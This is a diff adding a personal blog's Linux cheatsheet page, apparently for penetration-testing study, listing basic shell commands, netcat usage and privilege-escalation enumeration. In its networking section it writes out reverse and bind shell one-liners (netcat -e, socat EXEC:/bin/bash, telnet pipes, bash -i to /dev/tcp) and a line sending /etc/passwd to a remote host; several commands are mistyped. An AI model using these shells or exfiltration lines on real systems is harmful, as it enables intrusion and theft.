@@ -1,0 +1,450 @@
+<!DOCTYPE html>
+<!--
+    Basically Basic Jekyll Theme 1.4.5
+    Copyright 2017-2018 Michael Rose - mademistakes.com | @mmistakes
+    Free for personal and commercial use under the MIT license
+    https://github.com/mmistakes/jekyll-theme-basically-basic/blob/master/LICENSE
+-->
+<html lang="en-US" class="no-js">
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+    
+    <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Linux | Thekaiz3n</title>
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Linux" />
+<meta name="author" content="Thekaiz3n" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="This is a guide for linux" />
+<meta property="og:description" content="This is a guide for linux" />
+<link rel="canonical" href="http://localhost:4000/cheatsheet/2022/01/13/linux.html" />
+<meta property="og:url" content="http://localhost:4000/cheatsheet/2022/01/13/linux.html" />
+<meta property="og:site_name" content="Thekaiz3n" />
+<meta property="og:image" content="http://localhost:4000/assets/images/cheatsheet/linux.jpeg" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2022-01-13T00:00:00-03:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="http://localhost:4000/assets/images/cheatsheet/linux.jpeg" />
+<meta property="twitter:title" content="Linux" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Thekaiz3n"},"dateModified":"2022-04-21T00:00:00-03:00","datePublished":"2022-01-13T00:00:00-03:00","description":"This is a guide for linux","headline":"Linux","image":"http://localhost:4000/assets/images/cheatsheet/linux.jpeg","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/cheatsheet/2022/01/13/linux.html"},"url":"http://localhost:4000/cheatsheet/2022/01/13/linux.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  
+
+  <script>
+    /* Cut the mustard */
+    if ( 'querySelector' in document && 'addEventListener' in window ) {
+      document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + 'js';
+    }
+  </script>
+
+  <link rel="stylesheet" href="/assets/stylesheets/main.css">
+  
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Fira+Sans:400,400i,600,600i">
+  
+
+  
+    
+    <link rel="alternate" type="application/atom+xml" title="Thekaiz3n" href="/atom.xml">
+  
+</head>
+
+
+  <body class="layout--post linux">
+
+    <nav class="skip-links">
+  <h2 class="screen-reader-text">Skip links</h2>
+  <ul>
+    <li><a href="#primary-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+
+    <div class="sidebar-toggle-wrapper">
+      
+        <button class="search-toggle" type="button">
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <title>Search</title>
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+      
+
+      <button class="toggle navicon-button larr" type="button">
+        <span class="toggle-inner">
+          <span class="sidebar-toggle-label visually-hidden">Menu</span>
+          <span class="navicon"></span>
+        </span>
+      </button>
+    </div>
+
+    <div id="sidebar" class="sidebar">
+      <div class="inner">
+        <nav id="primary-nav" class="site-nav" itemscope itemtype="http://schema.org/SiteNavigationElement" aria-label="Main navigation">
+  <ul id="menu-main-navigation" class="menu">
+    <!-- Home link -->
+    <li class="menu-item">
+      <a href="/" itemprop="url">
+        <span itemprop="name">Home</span>
+      </a>
+    </li>
+
+    <!-- site.pages links -->
+    
+    
+
+    
+      
+      
+        <li class="menu-item">
+          <a href="/cheatsheet/" itemprop="url">
+            <span itemprop="name">Cheatsheet</span>
+          </a>
+        </li>
+      
+    
+      
+      
+        <li class="menu-item">
+          <a href="/blogs/" itemprop="url">
+            <span itemprop="name">Blog</span>
+          </a>
+        </li>
+      
+    
+      
+      
+        <li class="menu-item">
+          <a href="/writeups/" itemprop="url">
+            <span itemprop="name">Write-ups</span>
+          </a>
+        </li>
+      
+    
+      
+      
+        <li class="menu-item">
+          <a href="/about.html" itemprop="url">
+            <span itemprop="name">About</span>
+          </a>
+        </li>
+      
+    
+  </ul>
+</nav>
+
+        <ul class="contact-list">
+  
+    <li>
+      <a href="mailto:thekaiz3n@pm.me">
+        <span class="icon icon--email"><svg xmlns="http://www.w3.org/2000/svg" viewBox="313.1 3.7 16 16"><path d="M318.5 8.9c0-.2.2-.4.4-.4h4.5c.2 0 .4.2.4.4s-.2.4-.4.4h-4.5c-.3 0-.4-.2-.4-.4zm.4 2.1h4.5c.2 0 .4-.2.4-.4s-.2-.4-.4-.4h-4.5c-.2 0-.4.2-.4.4s.1.4.4.4zm3.5 1.2c0-.2-.2-.4-.4-.4h-3.1c-.2 0-.4.2-.4.4s.2.4.4.4h3.1c.2.1.4-.1.4-.4zm-1.5-8.4l-1.7 1.4c-.2.1-.2.4 0 .6s.4.2.6 0l1.4-1.2 1.4 1.2c.2.1.4.1.6 0s.1-.4 0-.6l-1.7-1.4c-.3-.1-.5-.1-.6 0zm7.8 6.2c.1.1.1.2.1.3v7.9c0 .8-.7 1.5-1.5 1.5h-12.5c-.8 0-1.5-.7-1.5-1.5v-7.9c0-.1.1-.2.1-.3l1.6-1.3c.2-.1.4-.1.6 0s.1.4 0 .6l-1.2 1 1.8 1.3v-4c0-.6.5-1.1 1.1-1.1h7.5c.6 0 1.1.5 1.1 1.1v4l1.8-1.3-1.2-1c-.2-.1-.2-.4 0-.6s.4-.2.6 0l1.6 1.3zm-11.6 2.2l4 2.8 4-2.8V7.6c0-.1-.1-.2-.2-.2h-7.5c-.1 0-.2.1-.2.2v4.6zm10.9-1l-4.7 3.4 3.4 2.6c.2.1.2.4.1.6-.1.2-.4.2-.6.1l-3.6-2.8-1.2.8c-.1.1-.3.1-.5 0l-1.2-.8-3.6 2.8c-.2.1-.4.1-.6-.1-.1-.2-.1-.4.1-.6l3.4-2.6-4.7-3.4v7.1c0 .4.3.6.6.6h12.5c.4 0 .6-.3.6-.6v-7.1z"/></svg></span>
+        <span class="label">Email</span>
+      </a>
+    </li>
+  
+
+  
+    <li><a href="https://github.com/thekaiz3n">
+  <span class="icon icon--github"><svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg" fill-rule="evenodd" clip-rule="evenodd" stroke-linejoin="round" stroke-miterlimit="1.414"><path d="M8 0C3.58 0 0 3.582 0 8c0 3.535 2.292 6.533 5.47 7.59.4.075.547-.172.547-.385 0-.19-.007-.693-.01-1.36-2.226.483-2.695-1.073-2.695-1.073-.364-.924-.89-1.17-.89-1.17-.725-.496.056-.486.056-.486.803.056 1.225.824 1.225.824.714 1.223 1.873.87 2.33.665.072-.517.278-.87.507-1.07-1.777-.2-3.644-.888-3.644-3.953 0-.873.31-1.587.823-2.147-.09-.202-.36-1.015.07-2.117 0 0 .67-.215 2.2.82.64-.178 1.32-.266 2-.27.68.004 1.36.092 2 .27 1.52-1.035 2.19-.82 2.19-.82.43 1.102.16 1.915.08 2.117.51.56.82 1.274.82 2.147 0 3.073-1.87 3.75-3.65 3.947.28.24.54.73.54 1.48 0 1.07-.01 1.93-.01 2.19 0 .21.14.46.55.38C13.71 14.53 16 11.53 16 8c0-4.418-3.582-8-8-8"/></svg></span>
+  <span class="label">GitHub</span>
+</a>
+</li>
+  
+
+  
+    <li><a href="https://twitter.com/ddkaiz3n">
+  <span class="icon icon--twitter"><svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg" fill-rule="evenodd" clip-rule="evenodd" stroke-linejoin="round" stroke-miterlimit="1.414"><path d="M16 3.038c-.59.26-1.22.437-1.885.517.677-.407 1.198-1.05 1.443-1.816-.634.37-1.337.64-2.085.79-.598-.64-1.45-1.04-2.396-1.04-1.812 0-3.282 1.47-3.282 3.28 0 .26.03.51.085.75-2.728-.13-5.147-1.44-6.766-3.42C.83 2.58.67 3.14.67 3.75c0 1.14.58 2.143 1.46 2.732-.538-.017-1.045-.165-1.487-.41v.04c0 1.59 1.13 2.918 2.633 3.22-.276.074-.566.114-.865.114-.21 0-.41-.02-.61-.058.42 1.304 1.63 2.253 3.07 2.28-1.12.88-2.54 1.404-4.07 1.404-.26 0-.52-.015-.78-.045 1.46.93 3.18 1.474 5.04 1.474 6.04 0 9.34-5 9.34-9.33 0-.14 0-.28-.01-.42.64-.46 1.2-1.04 1.64-1.7z" fill-rule="nonzero"/></svg></span>
+  <span class="label">Twitter</span>
+</a>
+</li>
+  
+
+  <li>
+    
+      <a href="/atom.xml" title="Atom Feed">
+        <span class="icon icon--rss"><svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg" fill-rule="evenodd" clip-rule="evenodd" stroke-linejoin="round" stroke-miterlimit="1.414"><path d="M12.8 16C12.8 8.978 7.022 3.2 0 3.2V0c8.777 0 16 7.223 16 16h-3.2zM2.194 11.61c1.21 0 2.195.985 2.195 2.196 0 1.21-.99 2.194-2.2 2.194C.98 16 0 15.017 0 13.806c0-1.21.983-2.195 2.194-2.195zM10.606 16h-3.11c0-4.113-3.383-7.497-7.496-7.497v-3.11c5.818 0 10.606 4.79 10.606 10.607z"/></svg></span>
+        <span class="label">Subscribe</span>
+      </a>
+    
+  </li>
+</ul>
+
+      </div>
+    </div>
+
+    <div class="canvas">
+      <div class="wrapper">
+        
+
+<header id="masthead">
+  <div class="inner">
+    <div class="title-area">
+      
+        <p class="site-title">
+          <a href="/">
+            
+            <span>Thekaiz3n</span>
+          </a>
+        </p>
+      
+    </div>
+  </div>
+</header>
+
+        <div class="initial-content">
+          <header class="intro">
+  
+    
+    <div class="intro-image">
+      <img src="/assets/images/cheatsheet/linux.jpeg" alt="Linux">
+    </div>
+  
+
+  <div class="inner">
+    <div class="intro-text">
+      <h1 id="page-title" class="intro-title">Linux
+</h1>
+      
+
+      
+        
+
+
+        <p class="entry-meta">
+          <span class="byline-item">by Thekaiz3n</span><span class="byline-item"><span class="icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="379 72 16 16"><g><g><path fill="none" d="M380.8,86.7h12.3v-8.8h-12.3V86.7z M389.5,78.8h1.7v1.4h-1.7V78.8z M389.5,81.3h1.7v1.4h-1.7V81.3z M389.5,83.8h1.7v1.4h-1.7V83.8z M386.1,78.8h1.7v1.4h-1.7V78.8z M386.1,81.3h1.7v1.4h-1.7V81.3z M386.1,83.8h1.7v1.4h-1.7V83.8z M382.8,78.8h1.7v1.4h-1.7V78.8z M382.8,81.3h1.7v1.4h-1.7V81.3z M382.8,83.8h1.7v1.4h-1.7V83.8z"/><polygon fill="none" points="384.7 75.1 383.4 75.1 383.4 74.3 380.8 74.3 380.8 76.6 393.2 76.6 393.2 74.3 390.6 74.3 390.6 75.1 389.3 75.1 389.3 74.3 384.7 74.3"/><rect x="382.8" y="78.8" width="1.7" height="1.4"/><rect x="386.1" y="78.8" width="1.7" height="1.4"/><rect x="389.5" y="78.8" width="1.7" height="1.4"/><rect x="382.8" y="81.3" width="1.7" height="1.4"/><rect x="386.1" y="81.3" width="1.7" height="1.4"/><rect x="389.5" y="81.3" width="1.7" height="1.4"/><rect x="382.8" y="83.8" width="1.7" height="1.4"/><rect x="386.1" y="83.8" width="1.7" height="1.4"/><rect x="389.5" y="83.8" width="1.7" height="1.4"/><path d="M383.4,72v1.1h-3.8V88h14.9V73.1h-3.8V72h-1.3v1.1h-4.7V72H383.4z M393.2,86.7h-12.3v-8.8h12.3L393.2,86.7L393.2,86.7z M389.3,74.3v0.8h1.3v-0.8h2.5v2.3h-12.3v-2.3h2.5v0.8h1.3v-0.8H389.3z"/></g></g></svg></span><time datetime="2022-04-21T00:00:00-03:00">Updated: April 21, 2022</time></span> <span class="byline-item"><span class="icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="15 309.7 16 16"><g><path d="M23.9 315.1v3.6c0 .5-.4.9-.9.9s-.9-.4-.9-.9v-3.6h1.8z"/><path d="M30.1 317.7c.5 3.9-2.3 7.5-6.2 7.9-3.9.5-7.5-2.3-7.9-6.2-.5-3.9 2.3-7.5 6.2-7.9v-1.8H24v1.8c1.1.1 2.7.7 3.5 1.4l1.3-1.3 1.3 1.3-1.3 1.3c.5.9 1.2 2.5 1.3 3.5zm-1.8.9c0-2.9-2.4-5.3-5.3-5.3s-5.3 2.4-5.3 5.3 2.4 5.3 5.3 5.3 5.3-2.3 5.3-5.3z"/></g></svg></span>3 min read</span>
+        </p>
+      
+
+      
+
+      
+    </div>
+  </div>
+</header>
+
+
+<main id="main" class="page-content" aria-label="Content">
+  <div class="inner">
+    <article class="entry-wrap">
+      <div class="entry-content">
+        <h2 id="linux-enumerate">Linux enumerate</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>man <span class="c"># manual of programs</span>
+<span class="nb">pwd</span> <span class="c"># Actula path.</span>
+<span class="nb">mkdir</span> <span class="c">#  Create directories</span>
+<span class="nb">ls</span> <span class="c"># List file</span>
+- <span class="nb">ls</span> <span class="nt">-l</span> <span class="c"># Show permissions, users and group, lenght and date</span>
+- <span class="nb">ls</span> <span class="nt">-a</span> <span class="c"># List hide files</span>
+- <span class="nb">ls</span> <span class="nt">-la</span> <span class="c"># List hide and permisions</span>
+<span class="nb">touch</span> <span class="c"># Create a file</span>
+<span class="nb">echo</span> <span class="c"># Write in screen</span>
+- <span class="nb">echo </span>exampletext <span class="o">&gt;</span> file <span class="c"># Save in a file</span>
+<span class="nb">cat</span> <span class="c"># Read the file</span>
+<span class="nb">cp</span> <span class="c"># Do a copy</span>
+<span class="nb">mv </span>file file1 <span class="c"># Move/rename the file</span>
+<span class="nb">head</span> <span class="c"># Read the first 5 lines</span>
+<span class="nb">tail</span> <span class="nt">-f</span> arquivoexemplo <span class="c"># Show in real time the end of file</span>
+<span class="c">## Users</span>
+/ect/passwd <span class="c"># Users list file</span>
+adduser nome <span class="c"># Create user</span>
+deluser nome <span class="c"># delete user</span>
+adduser nome <span class="nb">sudo</span> <span class="c"># Change permission to sudo </span>
+<span class="nb">cat</span> /var/log/auth.log <span class="c"># log of authentications </span>
+</code></pre></div></div>
+
+<h3 id="networks">Networks</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ifconfig <span class="c"># Network informations</span>
+service serviceexample restart <span class="c"># restart a service</span>
+netstat <span class="c"># Network open ports and configurations</span>
+traceroute <span class="c"># Trace the packages using TTL(Time to live).</span>
+hping3# MOst <span class="nb">complete </span>ping, can use SYN, port, etc.
+host# Identify DNS.
+netcat <span class="c"># Interacte and communicate with others services</span>
+- nc 10.0.0.0 443 
+- nc vlp port <span class="c"># Open the port and listenin</span>
+- nc <span class="nt">-vnlup</span> port <span class="c"># Open udp port</span>
+- nc <span class="nt">-vnu</span> ip <span class="c"># Connection UDP</span>
+- nc <span class="nt">-v</span> ip port &lt; file <span class="c"># Send a file.</span>
+- nc <span class="nt">-vnlp</span> port <span class="o">&gt;</span> file <span class="c"># Receive a file.</span>
+- Portscan
+    - nc <span class="nt">-vnz</span> ip port <span class="c"># Ports and show the service. (z - scan)</span>
+    - nc <span class="nt">-vnz</span> ip port-port 
+    - <span class="k">for </span>porta <span class="k">in</span> <span class="si">$(</span><span class="nb">cat </span>filetextports<span class="si">)</span><span class="p">;</span><span class="k">do </span>nc <span class="nt">-vnz</span> ip <span class="nv">$porta</span><span class="p">;</span><span class="k">done</span> <span class="c"># Sacn in a range</span>
+- honeypot
+    - <span class="k">while </span><span class="nb">true</span><span class="p">;</span><span class="k">do </span>nc <span class="nt">-vnlp</span> 21 &lt; 21.txt <span class="o">&gt;&gt;</span> 21.log 2&gt;&gt; 21.log<span class="p">;</span><span class="k">done</span> <span class="c"># SHow a false banner, capture and save the commands and errors</span>
+Reverse shell 
+- nc <span class="nt">-vnlp</span> port <span class="c"># </span>
+- nc.exe vn ip port <span class="nt">-e</span> cmd.exe 
+Bind shell
+- nc <span class="nt">-vnlp</span> port <span class="nt">-e</span> /bin/bash 
+- nc.exe <span class="nt">-vn</span> ip port <span class="c"># Victim - Open the port and receive shell</span>
+<span class="nt">-ncat</span> <span class="c"># Use cryptography</span>
+- openssl req <span class="nt">-x509</span> <span class="nt">-newkey</span> rsa#2048 <span class="nt">-keyout</span> chave.pem <span class="nt">-out</span> cert.pem <span class="nt">-days</span> 10 <span class="c"># Create a key to comunicate</span>
+- ncat <span class="nt">-vnlp</span> 8443 —ssl-key chave.pem —ssl-cert cert.pem <span class="c"># Open the ssl port</span>
+- ncat <span class="nt">-vn</span> 192.168.0.200 8443 —ssl <span class="c"># Victim</span>
+- ncat <span class="nt">-vnlp</span> 8443 —ssl-key chave.pem —ssl-cert cert.pem —allow 192.168.0.26 <span class="c"># Attack</span>
+Socat
+- socat - tcp4-listen#2222 <span class="c"># Open port</span>
+- socat - tcp4:19.168.0.200:4040 <span class="c"># Connect to ip port</span>
+- socat - tcp4:19.168.0.200:4040 EXEC:/bin/bash <span class="c"># Send bash</span>
+Telnet
+- telnet google.com 21 <span class="c">#  Connect to port</span>
+- telnet 172.20.1.74 4444 | /bin/bash | telnet 172.20.1.73 4445 <span class="c"># Shell reverse, send bash to 4444, and bash output to 4445</span>
+/dev/tcp
+- <span class="nb">echo</span> <span class="s2">"teste"</span> <span class="o">&gt;</span> /dev/tcp/192.168.0.4/4545 <span class="c"># Open a tcp socket</span>
+- <span class="nb">cat</span> /etc/passwd <span class="o">&gt;</span> /dev/tcp/192.168.0.4/4545 
+- <span class="o">&gt;</span>/dev/tcp/192.168.0.4/4545 <span class="c"># Connect to a machine</span>
+- bash <span class="nt">-i</span> <span class="o">&gt;</span>/dev/tcp/192.168.0.4/4545 0&gt;&amp;1 2&gt;&amp;1 <span class="c"># Send a bash to attackin machine/Reverse shell</span>
+Tor <span class="c"># service start tor</span>
+- proxychains# /etc/proxychains.conf
+    - socks5 127.0.0.1 9050
+    - dynamic_chain
+    - Navegador <span class="c"># Manual proxy 127.0.0.1 9050, check proxy dns</span>
+</code></pre></div></div>
+<h3 id="services">Services</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>update-rc.d service <span class="nb">enable</span> <span class="c"># Save a service to boot  </span>
+</code></pre></div></div>
+
+<h3 id="localizar--output">Localizar / Output</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>locate fileexample <span class="c"># Locate a file</span>
+updatedb <span class="c"># Update locate database</span>
+whereis programexample <span class="c"># Locate programs</span>
+which programexample <span class="c"># Locate binaries</span>
+<span class="nb">grep</span> <span class="s2">"bin/bash"</span> /etc/passwd <span class="c"># Search by a specifi line</span>
+<span class="nb">grep</span> <span class="s2">"bin/bash"</span> /etc/passw <span class="o">&gt;</span> exemple 
+<span class="nb">grep</span> <span class="nt">-v</span> <span class="s2">"nologin"</span> /etc/passw <span class="c"># Exclude the specific lines</span>
+egrep <span class="nt">-v</span> <span class="s2">"nologin | /bin/false"</span> /etc/passw 
+<span class="nb">awk</span> <span class="nt">-F</span> <span class="c"># '{print $1,$3}' /etc/passwd # Show based in a filter</span>
+<span class="nb">cut</span> <span class="nt">-d</span> <span class="nt">-f1</span>,f2 <span class="c"># Cut and show a specific</span>
+<span class="nb">sed</span> <span class="s1">'s/wrong/right'</span> filelocal <span class="c"># Replace ocurrencies in a file</span>
+<span class="nb">sort</span> <span class="c"># Adjust the ouitput</span>
+<span class="nb">uniq</span> <span class="c"># Delete all repeated occurencies(do sort before)</span>
+- <span class="nb">uniq</span> <span class="nt">-c</span> <span class="c"># Count lines</span>
+<span class="nb">wc</span> <span class="c"># Count</span>
+</code></pre></div></div>
+
+<h3 id="privilege-escalation-commands">Privilege escalation commands</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- <span class="nb">wc</span> <span class="nt">-l</span> <span class="c"># Count the lines</span>
+- <span class="nb">cat</span>  /etc/passwd <span class="c"># Users</span>
+- <span class="nb">hostname</span> <span class="c"># Mchine name</span>
+- <span class="nb">uname</span> <span class="nt">-a</span> <span class="c"># Kernel version x86/x64</span>
+- <span class="nb">cat</span> /etc/issue <span class="c"># SO version</span>
+- <span class="nb">cat</span> /etc/<span class="k">*</span><span class="nt">-release</span> <span class="c"># More complete SO informations</span>
+- dpkg <span class="nt">-l</span> <span class="c"># List programs and verions</span>
+- ifconfig <span class="nt">-a</span> <span class="c"># Network and adpters</span>
+- route <span class="c"># Route table and gateway</span>
+- netstat <span class="nt">-nlpt</span> <span class="c"># Open ports</span>
+- netstat <span class="nt">-nlpu</span> <span class="c"># UDP open ports</span>
+- ps <span class="nt">-aux</span> <span class="c"># Show running proccess</span>
+- <span class="nb">cat</span> /etc/crontab <span class="c"># Show as scripts and commands schedule</span>
+- find / <span class="nt">-writable</span> <span class="nt">-type</span> d 2&gt;/dev/null <span class="c"># Show directories with write permission</span>
+- find / <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=</span>s <span class="nt">-type</span> f 2&gt;/dev/null <span class="c"># Show programs that are executable </span>
+- <span class="nb">sudo</span> <span class="nt">-l</span> <span class="c"># With sudo permissions</span>
+</code></pre></div></div>
+
+      </div>
+      
+    </article>
+  </div>
+</main>
+
+        </div>
+
+        <div class="search-content">
+          <div class="inner">
+  <label class="visually-hidden" for="search">Site Search</label>
+        <input type="text" id="search" class="search-input" aria-describedby="results-count" tabindex="-1" placeholder="Enter your search term..." />
+        <div id="results" class="results"></div>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    <footer id="footer" class="site-footer">
+  <div class="inner">
+    <div class="copyright">
+      
+        <p>&copy; 2022 Thekaiz3n.</p>
+      
+    </div>
+  </div>
+</footer>
+
+    
+
+<script async src="/assets/javascripts/main.js"></script>
+
+<script src="https://code.jquery.com/jquery-3.3.1.min.js" integrity="sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8=" crossorigin="anonymous"></script>
+  <script src="http://localhost:4000/assets/javascripts/lunr/lunr.min.js"></script>
+  <script src="http://localhost:4000/assets/javascripts/lunr/lunr.store.js"></script>
+  <script>
+    var idx = lunr(function () {
+      
+      // the, the normal lunr index initialization
+      this.field('title')
+      this.field('excerpt')
+      this.field('categories')
+      this.field('tags')
+      this.ref('id')
+
+      this.pipeline.remove(lunr.trimmer)
+
+      // add documents to index
+      for (var item in store) {
+        this.add({
+          title: store[item].title,
+          excerpt: store[item].excerpt,
+          categories: store[item].categories,
+          tags: store[item].tags,
+          id: item
+        })
+      }
+    });
+
+    $(document).ready(function () {
+      $('input#search').on('keyup', function () {
+        var resultdiv = $('#results');
+        var query = $(this).val().toLowerCase();
+        var result =
+          idx.query(function (q) {
+            query.split(lunr.tokenizer.separator).forEach(function (term) {
+              q.term(term, { boost: 100 })
+              if (query.lastIndexOf(" ") != query.length - 1) {
+                q.term(term, { usePipeline: false, wildcard: lunr.Query.wildcard.TRAILING, boost: 10 })
+              }
+              if (term != "") {
+                q.term(term, { usePipeline: false, editDistance: 1, boost: 1 })
+              }
+            })
+          });
+        resultdiv.empty();
+        resultdiv.prepend('<p id="results-count" class="results-found">' + result.length + ' Result(s) found</p>');
+        for (var item in result) {
+          var ref = result[item].ref;
+          var searchitem =
+            '<article class="entry">' +
+              '<h3 class="entry-title">' +
+                '<a href="' + store[ref].url + '">' + store[ref].title + '</a>' +
+              '</h3>' +
+              '<div class="entry-excerpt">' +
+                '<p>' + store[ref].excerpt.split(" ").splice(0, 20).join(" ") + '...</p>' +
+              '</div>' +
+            '</article>';
+          resultdiv.append(searchitem);
+        }
+      });
+    });
+  </script>
+
+
+
+  </body>
+
+</html>
